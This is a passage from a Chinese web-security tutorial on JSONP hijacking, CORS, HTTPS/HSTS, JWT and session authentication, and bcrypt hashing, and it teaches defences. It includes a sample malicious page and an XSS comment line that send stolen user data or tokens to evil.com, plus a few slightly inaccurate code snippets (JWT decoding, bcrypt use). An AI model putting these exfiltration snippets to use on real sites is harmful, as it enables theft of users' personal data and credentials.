    C -->|"3. 返回回调调用|getData({data})"| D["浏览器执行脚本"]
    D -->|"4. 调用全局函数"| E["处理数据"]
```

```javascript
// 前端代码
// 1. 定义全局回调函数
window.receiveData = function(data) {
  console.log("收到数据：", data);
};

// 2. 创建 JSONP 请求
const script = document.createElement("script");
script.src = "https://api.example.com/user?callback=receiveData";
document.body.appendChild(script);

// 3. 服务端返回：receiveData({"name": "张三", "age": 25})
// 浏览器执行这段代码，就会调用 receiveData 函数
```

```javascript
// 服务端代码（Node.js）
app.get("/user", (req, res) => {
  const { callback } = req.query;
  const data = { name: "张三", age: 25 };

  // 返回 JSONP 格式：callbackName({data})
  res.send(`${callback}(${JSON.stringify(data)})`);
});
```

---

### 38.5.2 JSONP 劫持：利用 callback 参数注入恶意代码

JSONP 存在严重的安全漏洞——**JSONP 劫持**。

攻击者利用用户访问一个页面时，该页面会自动发起 JSONP 请求并携带用户 Cookie 的特性，窃取用户数据。

```mermaid
graph LR
    A["用户已登录A网站"] -->|"访问恶意网站B"| B["恶意页面"]
    B -->|"自动加载JSONP|携带Cookie"| C["A网站的API"]
    C -->|"返回用户数据"| D["恶意脚本执行"]
    D -->|"发送数据到攻击者服务器"| E["数据泄露！"]
    style B fill:#ff6b6b
    style E fill:#ff6b6b
```

**攻击代码示例**：

```html
<!-- 恶意网站页面 -->
<!DOCTYPE html>
<html>
<head>
  <title>恭喜获得红包</title>
  <script>
    // 攻击者定义的回调函数，目的是把数据发送走
    function stealData(data) {
      // 悄悄把数据发送到攻击者服务器
      fetch("https://evil.com/steal?data=" + JSON.stringify(data));
    }
  </script>
</head>
<body>
  <h1>🎁 红包领取中...</h1>

  <!-- 偷偷加载目标网站的 JSONP API -->
  <!-- 由于用户已登录，会携带 Cookie，返回用户敏感数据 -->
  <script src="https://target-site.com/api/userinfo?callback=stealData">
  </script>
</body>
</html>
```

当用户访问这个恶意页面时，`stealData` 函数会被触发，用户的敏感信息（如个人资料、邮箱等）就被发送到攻击者服务器了！

---

### 38.5.3 危害：窃取用户数据

**JSONP 劫持能窃取的数据类型**：

```javascript
// 常见的 JSONP 接口返回的数据
{
  "userId": 12345,
  "username": "zhangsan",
  "email": "zhangsan@example.com",
  "phone": "138****8888",
  "realName": "张三",
  "idCard": "110***********1234" // 身份证号！
}
```

**攻击场景**：

```javascript
// 1. 获取用户个人信息
https://social.com/api/me?callback=stealData

// 2. 获取用户好友列表
https://social.com/api/friends?callback=stealData

// 3. 获取用户聊天记录
https://chat.com/api/messages?callback=stealData

// 4. 获取用户订单信息
https://shop.com/api/orders?callback=stealData
```

---

### 38.5.4 防御：验证请求来源 / 使用 CORS 替代 JSONP

**防御一：验证 Referer 或 Origin**

```javascript
// 服务端验证请求来源
app.get("/api/user", (req, res) => {
  const referer = req.headers.referer;
  const origin = req.headers.origin;

  // 只允许指定的来源
  const allowedOrigins = ["https://mysite.com", "https://www.mysite.com"];

  if (!allowedOrigins.includes(origin)) {
    return res.status(403).send("Forbidden");
  }

  // 处理请求...
  res.json({ user: { name: "张三" } });
});
```

**防御二：使用 CSRF Token**

```javascript
// JSONP 请求也带上 Token
// 前端
const script = document.createElement("script");
script.src = `https://api.example.com/user?callback=handleData&token=${getCsrfToken()}`;

// 服务端验证
app.get("/api/user", (req, res) => {
  const { token } = req.query;
  const sessionToken = req.session.csrfToken;

  if (token !== sessionToken) {
    return res.status(403).send("Invalid token");
  }

  res.json({ user: { name: "张三" } });
});
```

**防御三：禁用 JSONP，使用 CORS**

**CORS（Cross-Origin Resource Sharing）** 是现代浏览器推荐的跨域解决方案，比 JSONP 安全得多！

```javascript
// 服务端设置 CORS
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "https://mysite.com");
  // 只允许特定的域名，不允许 *
  res.setHeader("Access-Control-Allow-Credentials", "true");
  next();
});

app.get("/api/user", (req, res) => {
  res.json({ user: { name: "张三" } });
});
```

```javascript
// 前端使用 fetch（不再需要 JSONP）
fetch("https://api.example.com/user", {
  credentials: "include" // 携带 Cookie
})
  .then(response => response.json())
  .then(data => console.log(data));
```

**JSONP vs CORS 对比**：

| 特性 | JSONP | CORS |
|------|-------|------|
| 原理 | script 标签 | HTTP 头 |
| 请求方法 | GET | 任意方法 |
| Cookie | 自动携带 | 需设置 credentials |
| 安全性 | 低（易被劫持） | 高 |
| 兼容性 | 老浏览器支持 | 现代浏览器 |
| 错误处理 | 困难 | 完整 |

---

**本节小结**

JSONP 是历史遗留的跨域方案，存在严重安全漏洞：

| 问题 | 说明 |
|------|------|
| JSONP 劫持 | 攻击者可窃取用户数据 |
| 缺乏错误处理 | 只能执行，无法捕获错误 |
| 只支持 GET | 无法发送复杂请求 |

**现代方案**：全面使用 CORS，废弃 JSONP！

## 38.6 CORS 跨域安全

### 38.6.1 CORS（跨域资源共享）的原理

**CORS（Cross-Origin Resource Sharing）** 是 W3C 制定的跨域访问标准，是现代 Web 开发中处理跨域问题的主流方案。

**同源策略回顾**：

```javascript
// 两个 URL 比较是否同源，需同时满足：协议、域名、端口相同
// https://example.com:443/page.html
// 协议: https
// 域名: example.com
// 端口: 443

// 同源示例
// https://example.com 和 https://example.com/api  ✅ 同源

// 异源示例
// https://example.com 和 http://example.com  ❌ 协议不同
// https://example.com 和 https://api.example.com  ❌ 域名不同
// https://example.com:8080 和 https://example.com:443  ❌ 端口不同
```

**CORS 原理图**：

```mermaid
graph LR
    A["浏览器"] -->|"1. 发送请求<br/>Origin: https://mysite.com"| B["服务器"]
    B -->|"2. 响应头<br/>Access-Control-Allow-Origin: https://mysite.com"| A
    A -->|"3. 检查允许的Origin"| C{"匹配?"}
    C -->|"是"| D["允许跨域访问"]
    C -->|"否"| E["阻止访问，控制台报错"]
    style D fill:#98d8c8
    style E fill:#ff6b6b
```

---

### 38.6.2 预检请求（Preflight Request）

对于**复杂请求**（如 PUT、DELETE 方法，或者请求头包含特定字段），浏览器会先发送一个 **OPTIONS** 方法的预检请求。

**简单请求 vs 复杂请求**：

```javascript
// 简单请求条件（同时满足）：
// 1. 方法：GET、POST、HEAD
// 2. 请求头：只有 Accept、Content-Type 等简单头
// 3. Content-Type：application/x-www-form-urlencoded、multipart/form-data、text/plain

// 复杂请求：
// PUT、DELETE 等方法
// 发送 JSON 数据：Content-Type: application/json
// 自定义请求头：X-Custom-Header
```

**预检请求流程**：

```mermaid
graph TD
    A["浏览器"] -->|"OPTIONS 预检请求<br/>Access-Control-Request-Method: PUT<br/>Access-Control-Request-Headers: Content-Type"| B["服务器"]
    B -->|"响应头<br/>Access-Control-Allow-Origin: https://mysite.com<br/>Access-Control-Allow-Methods: GET, POST, PUT<br/>Access-Control-Allow-Headers: Content-Type<br/>Access-Control-Max-Age: 3600"| A
    A -->|"实际 PUT 请求|带 Cookie"| B
    B -->|"PUT 响应|数据"| A
```

```javascript
// 预检请求处理
app.options("/api/data", (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "https://mysite.com");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, X-Custom-Header");
  res.setHeader("Access-Control-Max-Age", "86400"); // 缓存预检结果 24 小时
  res.sendStatus(204);
});

app.put("/api/data", (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "https://mysite.com");
  res.json({ message: "数据更新成功" });
});
```

---

### 38.6.3 Access-Control-Allow-Origin 的正确配置方式

**正确的配置方式**：

```javascript
// ✅ 方式1：指定具体域名
res.setHeader("Access-Control-Allow-Origin", "https://mysite.com");

// ✅ 方式2：从请求头读取并验证
const origin = req.headers.origin;
const allowedOrigins = ["https://mysite.com", "https://www.mysite.com"];
if (allowedOrigins.includes(origin)) {
  res.setHeader("Access-Control-Allow-Origin", origin);
}
```

**❌ 错误的配置方式**：

```javascript
// ❌ 设置为 * 是错误的（除非不携带 Cookie）
res.setHeader("Access-Control-Allow-Origin", "*");

// ❌ 从请求头直接读取并设置（可能被伪造）
res.setHeader("Access-Control-Allow-Origin", req.headers.origin);
```

---

### 38.6.4 敏感接口禁止设置为 *

**为什么不能设置 `*`？**

```javascript
// 敏感接口示例
app.get("/api/user/profile", (req, res) => {
  // 返回用户敏感信息
  res.json({
    name: "张三",
    email: "zhangsan@example.com",
    phone: "138****8888"
  });
});

// 如果设置 Access-Control-Allow-Origin: *
// 任何网站都能通过 fetch 获取用户信息！
```

**正确做法**：

```javascript
// 只有授权的域名才能访问敏感接口
const sensitiveOrigins = [
  "https://mysite.com",
  "https://admin.mysite.com"
];

app.get("/api/user/profile", (req, res) => {
  const origin = req.headers.origin;

  if (!sensitiveOrigins.includes(origin)) {
    return res.status(403).json({ error: "未授权的来源" });
  }

  res.setHeader("Access-Control-Allow-Origin", origin);
  res.json({ name: "张三", email: "zhangsan@example.com" });
});
```

---

### 38.6.5 credentials: true 的安全配置要求

当前端请求需要携带 Cookie 时，CORS 有特殊的安全要求：

```javascript
// 前端设置
fetch("https://api.example.com/user", {
  credentials: "include" // 包含 Cookie
});

// 或者
axios.defaults.withCredentials = true;
```

```javascript
// 服务端必须：
// 1. Access-Control-Allow-Origin 不能是 *
// 2. 必须明确指定允许的域名
res.setHeader("Access-Control-Allow-Origin", "https://mysite.com"); // 不能是 *
res.setHeader("Access-Control-Allow-Credentials", "true");
```

**credentials 配置详解**：

| 值 | 说明 |
|----|------|
| include | 始终发送凭证（Cookie、Authorization 头） |
| same-origin | 仅同源请求发送凭证 |
| omit | 从不发送凭证 |

**安全检查清单**：

```javascript
app.use((req, res, next) => {
  // 1. 允许的来源列表
  const allowedOrigins = ["https://mysite.com", "https://admin.mysite.com"];
  const origin = req.headers.origin;

  if (allowedOrigins.includes(origin)) {
    res.setHeader("Access-Control-Allow-Origin", origin);
  }

  // 2. 允许携带凭证
  res.setHeader("Access-Control-Allow-Credentials", "true");

  // 3. 允许的方法
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE");

  // 4. 允许的请求头
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");

  // 5. 暴露响应头（让前端可以访问）
  res.setHeader("Access-Control-Expose-Headers", "X-Total-Count");

  next();
});
```

**CORS 配置流程图**：

```mermaid
graph TD
    A["请求"] --> B{"简单请求?"}
    B -->|"是"| C["直接发送请求"]
    C --> D{"检查ACAO响应头"}
    D -->|"匹配"| E["成功"]
    D -->|"不匹配"| F["被浏览器拦截"]
    B -->|"否|预检"| G["OPTIONS预检请求"]
    G --> H{"检查预检响应头"}
    H -->|"通过"| I["发送实际请求"]
    H -->|"不通过"| J["阻止请求"]
    style E fill:#98d8c8
    style F fill:#ff6b6b
    style I fill:#98d8c8
    style J fill:#ff6b6b
```

---

**本节小结**

CORS 是现代跨域方案的核心：

| 配置项 | 说明 |
|-------|------|
| Access-Control-Allow-Origin | 允许的来源（不能是 * 如果需要 Cookie） |
| Access-Control-Allow-Credentials | 是否允许携带凭证 |
| Access-Control-Allow-Methods | 允许的方法 |
| Access-Control-Allow-Headers | 允许的请求头 |
| Access-Control-Max-Age | 预检结果缓存时间 |

**安全原则**：敏感接口禁止 `Access-Control-Allow-Origin: *`，必须明确指定允许的域名！

## 38.7 HTTPS 与传输安全

### 38.7.1 HTTP vs HTTPS：加密传输，防止中间人攻击

**HTTP（HyperText Transfer Protocol）** 是明文传输协议，数据在网络上"裸奔"，任何人都能截获和查看。

**HTTPS（HTTP Secure）** 在 HTTP 基础上增加了 SSL/TLS 加密，就像给你的数据包穿上了防弹衣！

```mermaid
graph LR
    subgraph HTTP["❌ HTTP 明文传输"]
        A1["浏览器"] -->|"原始数据|用户名、密码"| B["中间人"]
        B -->|"原始数据"| C["服务器"]
        B -->|"窃听/篡改"| D["危险！"]
    end
    subgraph HTTPS["✅ HTTPS 加密传输"]
        A2["浏览器"] -->|"加密数据| ciphertext"| E["加密通道"]
        E -->|"加密数据"| F["服务器"]
        E -->|"无法窃听"| G["安全！"]
    end
    style D fill:#ff6b6b
    style G fill:#98d8c8
```

**HTTP 的问题**：

```javascript
// 假设用户通过 HTTP 提交表单
// 用户名: zhangsan
// 密码: 123456

// 中间人（黑客、WiFi 提供者等）可以轻易截获：
// POST /login HTTP/1.1
// Host: example.com
// Content-Type: application/x-www-form-urlencoded
//
// username=zhangsan&password=123456
// ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
// 所有数据明文可见！
```

**HTTPS 的优势**：

```javascript
// 同一请求在 HTTPS 下变成：
// 加密后的数据（不可读）
// 8f3d#@2sdf9...（乱码）
// 即使被截获也无法理解内容！
```

---

### 38.7.2 对称加密 vs 非对称加密：SSL/TLS 握手过程

加密算法分为两大类：**对称加密**和**非对称加密**。

**对称加密**：

```javascript
// 加密和解密使用相同的密钥
// 场景：你有一把钥匙，能锁门也能开门

const crypto = require("crypto");

// AES-256 需要 32 字节密钥，AES-128 需要 16 字节密钥
// 这里使用 32 字节（256 位）密钥，用随机数生成更安全
const key = crypto.randomBytes(32); // 生成安全的随机密钥
const iv = crypto.randomBytes(16); // 16 字节初始向量

// 加密
const cipher = crypto.createCipheriv("aes-256-cbc", key, iv);
let encrypted = cipher.update("Hello World", "utf8", "hex");
encrypted += cipher.final("hex");
console.log("加密后:", encrypted); // 加密后: a7b3c9d8...

// 解密
const decipher = crypto.createDecipheriv("aes-256-cbc", key, iv);
let decrypted = decipher.update(encrypted, "hex", "utf8");
decrypted += decipher.final("utf8");
console.log("解密后:", decrypted); // 解密后: Hello World
```

**非对称加密**：

```javascript
// 有一对密钥：公钥和私钥
// 公钥加密，私钥解密（或者反过来）
// 场景：锁和钥匙不同，锁公开给所有人，钥匙只有自己保留

const crypto = require("crypto");

// 生成密钥对
const { publicKey, privateKey } = crypto.generateKeyPairSync("rsa", {
  modulusLength: 2048,
  publicKeyEncoding: { type: "spki", format: "pem" },
  privateKeyEncoding: { type: "pkcs8", format: "pem" }
});

// 公钥加密
const encrypted = crypto.publicEncrypt(
  { key: publicKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING },
  Buffer.from("Secret Message")
);
console.log("公钥加密:", encrypted.toString("hex"));

// 私钥解密
const decrypted = crypto.privateDecrypt(
  { key: privateKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING },
  encrypted
);
console.log("私钥解密:", decrypted.toString("utf8")); // Secret Message
```

**SSL/TLS 握手过程**（混合加密）：

```mermaid
sequenceDiagram
    participant B as 浏览器
    participant S as 服务器

    Note over B,S: 1. 握手开始
    B->>S: 发送支持的加密套件列表、随机数

    Note over B,S: 2. 服务器返回证书+公钥
    S->>B: 证书(包含公钥)、随机数

    Note over B,S: 3. 浏览器验证证书
    B->>B: 检查证书有效性、吊销状态

    Note over B,S: 4. 生成会话密钥(对称密钥)
    B->>B: 用公钥加密会话密钥

    B->>S: 发送加密后的会话密钥

    Note over B,S: 5. 握手完成，后续用会话密钥通信
    B->>S: (对称加密的数据)
    S->>B: (对称加密的数据)
```

---

### 38.7.3 混合加密：对称加密传输数据，非对称加密交换密钥

**为什么需要混合加密？**

| 加密类型 | 优点 | 缺点 |
|---------|------|------|
| 对称加密 | 速度快 | 密钥传输不安全 |
| 非对称加密 | 密钥传输安全 | 速度慢 |

**混合加密的解决方案**：

```mermaid
graph LR
    A["浏览器"] -->|"1. 生成会话密钥(对称)"| B["使用公钥加密会话密钥"]
    B -->|"2. 发送加密的会话密钥"| C["服务器"]
    C -->|"3. 用私钥解密获取会话密钥"| C
    A & C -->|"4. 双方使用会话密钥通信|对称加密"| D["安全通信"]
```

**实际工作流程**：

```javascript
// TLS/SSL 握手简化流程（概念性）

// 1. 浏览器生成随机数 A
const randomA = crypto.randomBytes(32);

// 2. 服务器生成随机数 B，并发送证书（包含公钥）
const randomB = crypto.randomBytes(32);
const serverCert = { publicKey: "...", domain: "example.com" };

// 3. 浏览器验证证书后，用公钥加密预备主密钥
const premasterSecret = crypto.randomBytes(48);
const encryptedPremaster = crypto.publicEncrypt(
  serverCert.publicKey,
  premasterSecret
);

// 4. 服务器用私钥解密，获取预备主密钥
const decryptedPremaster = crypto.privateDecrypt(
  serverPrivateKey,
  encryptedPremaster
);

// 5. 双方用相同的算法从 A、B 和预备主密钥计算出主密钥（会话密钥）
// 6. 后续通信使用会话密钥进行对称加密
```

---

### 38.7.4 证书与 CA 机构的作用

**数字证书**就像网站的"身份证"，由**CA（Certificate Authority，证书颁发机构）"公证"。

```mermaid
graph LR
    A["网站申请证书"] --> B["CA 验证身份"]
    B -->|"验证域名所有权|企业信息"| C["颁发证书"]
    C -->|"证书包含|公钥+域名+CA签名"| D["浏览器访问网站"]
    D -->|"验证 CA 签名"| E{"证书有效?"}
    E -->|"是"| F["信任连接"]
    E -->|"否"| G["拒绝访问"]
    style F fill:#98d8c8
    style G fill:#ff6b6b
```

**证书内容**：

```javascript
// 证书的主要字段（简化版）
{
  subject: {
    C: "CN",           // 国家
    ST: "Beijing",     // 省份
    L: "Beijing",      // 城市
    O: "Example Inc",  // 组织
    CN: "example.com"  // 域名
  },
  issuer: {
    C: "US",
    O: "DigiCert Inc",  // CA 机构
    CN: "DigiCert SHA2 Extended Validation Server CA"
  },
  publicKey: "...",     // 公钥
  validFrom: "2024-01-01",
  validTo: "2025-01-01",
  serialNumber: "0a:1b:2c:...",  // 序列号
  signature: "...",  // CA 的数字签名
  signatureAlgorithm: "sha256WithRSAEncryption"
}
```

**自签名证书的问题**：

```javascript
// 自签名证书是自己给自己签发的，没有 CA 信任链
// 浏览器不认识这个 CA，会显示安全警告

// 开发环境可以用自签名证书
// 生产环境必须使用受信任 CA 签发的证书

// 常见 CA 机构：
// - DigiCert
// - GlobalSign
// - Let's Encrypt（免费）
// - 沃通
// - 腾讯云
```

---

### 38.7.5 HSTS（HTTP Strict Transport Security）：强制使用 HTTPS

**HSTS** 是一个响应头，告诉浏览器：**这个网站必须使用 HTTPS 连接，禁止 HTTP 访问**。

```javascript
// 设置 HSTS 响应头
res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
```

**参数说明**：

| 参数 | 说明 |
|------|------|
| max-age | HSTS 有效期（秒），建议至少 1 年 |
| includeSubDomains | 包含子域名也必须 HTTPS |
| preload | 申请加入浏览器预加载列表 |

```nginx
# Nginx 配置
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

```apache
# Apache 配置
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
```

**HSTS 工作流程**：

```mermaid
graph LR
    A["用户首次访问http://example.com"]
    A -->|"服务器返回HSTS头"| B["浏览器记住"]
    B -->|"max-age=1年"| C["1年内浏览器强制HTTPS"]
    C -->|"用户输入http://"| D["浏览器自动转https://"]
    style C fill:#98d8c8
```

**HSTS 预加载列表**：

```javascript
// HSTS 预加载列表（HSTS Preload List）是硬编码在浏览器里的
// 一旦申请并被接受，即使站点过期也会强制 HTTPS

// 申请地址：https://hstspreload.org
// 要求：
// 1. HSTS max-age 至少 31536000（1年）
// 2. 必须 includeSubDomains
// 3. 必须 preload
// 4. 必须是有效证书
```

---

**本节小结**

HTTPS 是 Web 安全的基石：

| 概念 | 说明 |
|------|------|
| HTTP vs HTTPS | 明文 vs 加密 |
| 对称加密 | 加密解密同一密钥，速度快 |
| 非对称加密 | 公钥加密、私钥解密，密钥传输安全 |
| SSL/TLS 握手 | 混合加密：非对称交换密钥，对称传输数据 |
| CA 证书 | 受信任机构签发的网站身份证明 |
| HSTS | 强制浏览器使用 HTTPS |

## 38.8 认证与授权安全

### 38.8.1 Session vs Token：认证机制对比

**Session（会话）和 Token 是两种主流的认证机制。**

**Session 认证流程**：

```mermaid
graph LR
    A["用户登录"] -->|"1. 验证密码"| B["服务器"]
    B -->|"2. 创建Session<br/>保存用户信息"| C["Session存储<br/>Redis/数据库"]
    B -->|"3. 返回Session ID"| D["浏览器Cookie"]
    D -->|"4. 后续请求携带Cookie"| B
    B -->|"5. 查询Session验证"| C
    C -->|"6. 返回用户信息"| B
```

```javascript
// Session 认证示例（Express + Redis）
const express = require("express");
const session = require("express-session");
const RedisStore = require("connect-redis")(session);

const app = express();

// 使用 Redis 存储 Session
app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: "very-secret-key",
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: false, // 生产环境应为 true
    httpOnly: true, // 防止 XSS 读取 Cookie
    maxAge: 1000 * 60 * 60 * 24 // 24 小时
  }
}));

app.post("/login", (req, res) => {
  const { username, password } = req.body;

  // 验证用户
  if (validateUser(username, password)) {
    // 创建 Session
    req.session.userId = getUserId(username);
    res.json({ success: true });
  } else {
    res.status(401).json({ error: "用户名或密码错误" });
  }
});

app.get("/profile", (req, res) => {
  // Session 验证
  if (!req.session.userId) {
    return res.status(401).json({ error: "未登录" });
  }
  res.json({ userId: req.session.userId });
});
```

**Token 认证流程**：

```mermaid
graph LR
    A["用户登录"] -->|"1. 验证密码"| B["服务器"]
    B -->|"2. 生成JWT Token"| C["返回Token给前端"]
    C -->|"3. 前端存储Token"| D["localStorage/Cookie"]
    D -->|"4. 请求携带Token|Authorization: Bearer xxx"| B
    B -->|"5. 验证Token签名"| B
```

```javascript
// Token 认证示例（JWT）
const jwt = require("jsonwebtoken");
const secret = "your-secret-key";

app.post("/login", (req, res) => {
  const { username, password } = req.body;

  if (validateUser(username, password)) {
    // 生成 Token
    const token = jwt.sign(
      { userId: getUserId(username), username },
      secret,
      { expiresIn: "24h" }
    );
    res.json({ token });
  }
});

// 中间件验证 Token
const authenticate = (req, res, next) => {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return res.status(401).json({ error: "未提供 Token" });
  }

  const token = authHeader.substring(7);

  try {
    const decoded = jwt.verify(token, secret);
    req.user = decoded;
    next();
  } catch (err) {
    res.status(401).json({ error: "Token 无效或已过期" });
  }
};

app.get("/profile", authenticate, (req, res) => {
  res.json({ userId: req.user.userId, username: req.user.username });
});
```

**Session vs Token 对比**：

| 特性 | Session | Token |
|------|---------|-------|
| 存储位置 | 服务器（Redis/数据库） | 客户端 |
| 扩展性 | 分布式部署需共享 Session | 无状态，易扩展 |
| 跨域 | 需要特殊处理 | 天然支持跨域 |
| 安全性 | Cookie HttpOnly，较安全 | 需防范 XSS |
| 性能 | 需要查询存储 | 无需服务器查询 |

---

### 38.8.2 JWT（JSON Web Token）的结构：Header / Payload / Signature

**JWT** 是一种开放标准（RFC 7519），用于在各方之间安全地传输信息。

**JWT 结构**：

```javascript
// JWT 由三部分组成，用点号分隔
// header.payload.signature

const token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJ1c2VybmFtZSI6InpoYW5nMSIsImlhdCI6MTYyMzQ2NDI0MH0.abc123signature";
```

**Header（头部）**：

```javascript
// 第一部分：JWT 头部
const header = {
  alg: "HS256", // 加密算法
  typ: "JWT"    // Token 类型
};

// Base64URL 编码后
// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

**Payload（载荷）**：

```javascript
// 第二部分：JWT 载荷
const payload = {
  userId: "123",       // 用户 ID
  username: "zhang1", // 用户名
  role: "admin",       // 角色
  iat: 1623464240,     // 签发时间
  exp: 1623550640      // 过期时间
};

// Base64URL 编码后
// eyJ1c2VySWQiOiIxMjMiLCJ1c2VybmFtZSI6InpoYW5nMSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYyMzQ2NDI0MH0
```

**Signature（签名）**：

```javascript
// 第三部分：签名
// HMACSHA256(
//   base64UrlEncode(header) + "." + base64UrlEncode(payload),
//   secret
// )
// 结果：abc123signature
```

**完整 JWT 解析**：

```javascript
const jwt = require("jsonwebtoken");

const token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJ1c2VybmFtZSI6InpoYW5nMSIsImlhdCI6MTYyMzQ2NDI0MH0.abc123signature";

// 解析 JWT
const decoded = jwt.decode(token);

console.log(decoded.header);
// { alg: 'HS256', typ: 'JWT' }

console.log(decoded.payload);
// { userId: '123', username: 'zhang1', iat: 1623464240, exp: 1623550640 }
```

---

### 38.8.3 Token 的存储安全：localStorage vs Cookie（HttpOnly）的权衡

**Token 存储位置选择**：

| 存储位置 | 优点 | 缺点 | 推荐场景 |
|---------|------|------|---------|
| localStorage | 容量大，简单易用 | 易受 XSS 攻击 | 非敏感接口 |
| sessionStorage | 页面关闭即清除 | 易受 XSS 攻击 | 临时数据 |
| Cookie (HttpOnly) | 可防 XSS，自动发送 | 容量小，易受 CSRF | 敏感操作 |

**localStorage 存储（易受 XSS）**：

```javascript
// 登录成功后存储 Token
localStorage.setItem("token", jwtToken);

// 后续请求使用
const token = localStorage.getItem("token");
fetch("/api/user", {
  headers: { Authorization: `Bearer ${token}` }
});

// 问题：如果页面存在 XSS 漏洞，攻击者可以读取 localStorage
// <script>fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))</script>
```

**Cookie HttpOnly 存储（推荐但有 CSRF 风险）**：

```javascript
// 服务端设置 HttpOnly Cookie
res.cookie("token", jwtToken, {
  httpOnly: true, // JavaScript 无法访问
  secure: true,   // 仅 HTTPS
  sameSite: "lax" // CSRF 保护
});

// 浏览器自动发送 Cookie，无需手动处理
fetch("/api/user")
```

**最佳实践：结合使用**：

```javascript
// 1. Token 存在 HttpOnly Cookie（防止 XSS 读取）
// 2. 使用 CSRF Token 防止 CSRF
// 3. 或者使用 SameSite Cookie

// 升级方案：短期 Access Token + 长期 Refresh Token
const tokens = {
  accessToken: "短期 Token，有效期 15 分钟",
  refreshToken: "长期 Token，有效期 7 天"
};
```

---

### 38.8.4 Token 过期与刷新机制

**Access Token 短期失效 + Refresh Token 续期**：

```mermaid
graph LR
    A["登录"] -->|"返回access+refresh"| B["前端存储"]
    B -->|"使用accessToken"| C["请求API"]
    C -->|"access过期|401"| D["前端"]
    D -->|"用refreshToken换取新accessToken"| E["刷新接口"]
    E -->|"返回新accessToken"| B
```

```javascript
// JWT 刷新机制示例

// 登录
app.post("/login", (req, res) => {
  const { username, password } = req.body;

  if (validateUser(username, password)) {
    const user = getUser(username);

    // Access Token：短期有效（15分钟）
    const accessToken = jwt.sign(
      { userId: user.id, type: "access" },
      secret,
      { expiresIn: "15m" }
    );

    // Refresh Token：长期有效（7天）
    const refreshToken = jwt.sign(
      { userId: user.id, type: "refresh" },
      refreshSecret,
      { expiresIn: "7d" }
    );

    res.json({ accessToken, refreshToken });
  }
});

// 刷新 Access Token
app.post("/refresh", (req, res) => {
  const { refreshToken } = req.body;

  try {
    const decoded = jwt.verify(refreshToken, refreshSecret);

    if (decoded.type !== "refresh") {
      throw new Error("Invalid token type");
    }

    // 生成新的 Access Token
    const newAccessToken = jwt.sign(
      { userId: decoded.userId, type: "access" },
      secret,
      { expiresIn: "15m" }
    );

    res.json({ accessToken: newAccessToken });
  } catch (err) {
    res.status(401).json({ error: "Refresh Token 无效" });
  }
});
```

```javascript
// 前端自动刷新 Token
let accessToken = localStorage.getItem("accessToken");
let refreshToken = localStorage.getItem("refreshToken");

async function fetchWithAuth(url, options = {}) {
  const response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      Authorization: `Bearer ${accessToken}`
    }
  });

  if (response.status === 401) {
    // Access Token 过期，尝试刷新
    const refreshResponse = await fetch("/refresh", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ refreshToken })
    });

    if (refreshResponse.ok) {
      const { accessToken: newToken } = await refreshResponse.json();
      accessToken = newToken;
      localStorage.setItem("accessToken", newToken);

      // 重试原请求
      return fetch(url, {
        ...options,
        headers: {
          ...options.headers,
          Authorization: `Bearer ${newToken}`
        }
      });
    } else {
      // Refresh Token 也过期，需要重新登录
      localStorage.removeItem("accessToken");
      localStorage.removeItem("refreshToken");
      window.location.href = "/login";
    }
  }

  return response;
}
```

---

### 38.8.5 密码安全：明文传输的危害 / 加密传输 / bcrypt 等哈希算法

**密码绝对不能明文存储！**

```mermaid
graph LR
    A["用户注册"] -->|"密码123456"| B["服务器"]
    B -->|"❌明文存储"| C["数据库"]
    C -->|"数据泄露"| D["用户密码曝光"]
    D -->|"用户在多个网站使用相同密码"| E["全军覆没！"]
    style D fill:#ff6b6b
    style E fill:#ff6b6b
```

**使用 bcrypt 哈希密码**：

```javascript
const bcrypt = require("bcrypt");

// 注册时：哈希密码
async function register(username, password) {
  // 生成盐并哈希密码（强度 10，计算约 100ms）
  const hashedPassword = await bcrypt.hash(password, 10);

  // 存储哈希后的密码
  db.users.insert({
    username,
    password: hashedPassword
  });
}

// 登录时：验证密码
async function login(username, password) {
  const user = await db.users.findOne({ username });

  if (!user) {
    return false;
  }

  // 使用 bcrypt 比较密码
  const match = await bcrypt.compare(password, user.password);

  if (match) {
    // 密码正确
    return { success: true, userId: user.id };
  } else {
    return { success: false };
  }
}
```

**bcrypt 的特点**：

```javascript
// bcrypt 会自动：
// 1. 生成随机盐
// 2. 哈希密码
// 3. 存储盐和哈希值在一起

// 哈希结果示例：
// $2b$10$iglXM5qX4xEQrKj3YfX5ZeKpZvL6VJ1Zq3Zq3Zq3Zq3Zq3Zq3Zq3
// $2b$ = bcrypt 算法版本
// $10$ = 强度因子（2^10 = 1024 次迭代，计算较慢但安全）
// 后面是盐和哈希值
```

**彩虹表攻击与盐的作用**：

```javascript
// 没有盐：相同密码哈希值相同，容易被彩虹表攻击
const hash1 = md5("123456"); // e10adc3949ba59abbe56e057f20f883e
const hash2 = md5("123456"); // e10adc3949ba59abbe56e057f20f883e（相同！）

// 有盐：每个用户密码哈希值都不同，彩虹表失效
const hash1 = bcrypt.hash("123456", 10); // $2b$10$xxx...（随机盐）
